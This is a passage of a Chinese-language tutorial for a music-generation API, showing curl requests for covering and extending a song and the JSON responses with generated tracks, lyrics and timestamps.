class="number">1</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"Woke"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">"funk vibes, raspy, raw vocal texture"</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">158.08</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"64fffe1f-b1aa-46dc-8012-b80ba319cf35"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Pure Dawn"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3f3e1354-52ad-4f5b-902c-5f83abd17def/image/64fffe1f-b1aa-46dc-8012-b80ba319cf35.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3f3e1354-52ad-4f5b-902c-5f83abd17def/audio/64fffe1f-b1aa-46dc-8012-b80ba319cf35.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T01:57:33.963497Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">1</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"Woke"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">"contemporary country"</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">175.36</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="翻唱歌曲"><a href="#翻唱歌曲" class="headerlink" title="翻唱歌曲"></a>翻唱歌曲</h2>
                  <p>如果想对已经生成的歌曲进行翻唱操作的操作，可以输入上文生成的歌曲进行翻唱，接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此次歌曲任务的行为，目前支持：generate、cover、extend、upload_cover、upload_extend、replace_section、swap_sound、swap_vocals，此次翻唱使用<code>cover</code>参数。</li>
                    <li>lyric：歌词文本</li>
                    <li>title：歌曲的标题。</li>
                    <li>audio_id：歌曲的ID。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/e5egk2.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/u0ei5u.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "cover",</span><br><span class="line">  "model": "FUZZ-1.0 Pro",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "audio_id": "b7376272-3902-49b4-a83b-62f7e6ab505c"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"fe02997d-f58e-4886-9aa3-4074c9a430eb"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"997bde4c-6063-4fc2-9b03-d837f1efc72d"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"be254182-d4b7-42b3-9ee2-b86db086cff1"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Sunny Rise"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/c2f707a9-017d-4354-8bfa-436266dadbf6/image/be254182-d4b7-42b3-9ee2-b86db086cff1.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/c2f707a9-017d-4354-8bfa-436266dadbf6/audio/be254182-d4b7-42b3-9ee2-b86db086cff1.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T01:59:17.666629Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">237.44</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">236.8</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">239.46235827664398</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"9b9d2810-eb2b-44d3-85c0-cb259afa13c3"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Uplift"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/c2f707a9-017d-4354-8bfa-436266dadbf6/image/9b9d2810-eb2b-44d3-85c0-cb259afa13c3.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/c2f707a9-017d-4354-8bfa-436266dadbf6/audio/9b9d2810-eb2b-44d3-85c0-cb259afa13c3.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T01:59:23.065712Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">236.16</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">225.28</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">239.5299546485261</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="续写歌曲"><a href="#续写歌曲" class="headerlink" title="续写歌曲"></a>续写歌曲</h2>
                  <p>如果想续写歌曲的话，我们需要传入<code>action</code>参数值为：<code>extend</code>，接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此次歌曲任务的行为，目前支持：generate、cover、extend、upload_cover、upload_extend、replace_section、swap_vocals、swap_sound，此次续写使用<code>extend</code>参数。</li>
                    <li>lyric：歌词文本</li>
                    <li>title：歌曲的标题。</li>
                    <li>audio_id：歌曲的ID。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/1im68k.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/yctbdk.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "extend",</span><br><span class="line">  "model": "FUZZ-1.0 Pro",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "audio_id": "b7376272-3902-49b4-a83b-62f7e6ab505c",</span><br><span class="line">  "continue_at": 5</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"6388a0aa-b5ab-4485-baad-f0e0b7a7848c"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"da143dbe-8263-45ac-b05a-1ed57dd4aa79"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"209e27e0-500c-44f3-9134-280690014920"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"City Rhythm"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3a8378d5-94d4-49b7-9c0a-8432c0c4a39d/image/209e27e0-500c-44f3-9134-280690014920.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3a8378d5-94d4-49b7-9c0a-8432c0c4a39d/audio/209e27e0-500c-44f3-9134-280690014920.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:00:53.473604Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">4.48</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">4.48</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">179.2</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">178.56</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">197.00850340136054</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"ff50012e-ad1b-4b71-8d0e-6a633428a54f"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Bright"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3a8378d5-94d4-49b7-9c0a-8432c0c4a39d/image/ff50012e-ad1b-4b71-8d0e-6a633428a54f.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3a8378d5-94d4-49b7-9c0a-8432c0c4a39d/audio/ff50012e-ad1b-4b71-8d0e-6a633428a54f.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:00:52.795796Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">186.88</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">186.24</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">213.85757369614512</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="替换片段"><a href="#替换片段" class="headerlink" title="替换片段"></a>替换片段</h2>
                  <p>如果想对歌曲进行替换片段的话，我们需要传入<code>action</code>参数值为：<code>replace_section</code>，接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此次歌曲任务的行为，目前支持：generate、cover、extend、upload_cover、upload_extend、replace_section、swap_vocals、swap_sound，此次续写使用<code>extend</code>参数。</li>
                    <li>lyric：需要替换后的歌词文本</li>
                    <li>title：歌曲的标题。</li>
                    <li>audio_id：歌曲的ID。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/gbxazr.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/yb4wr9.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
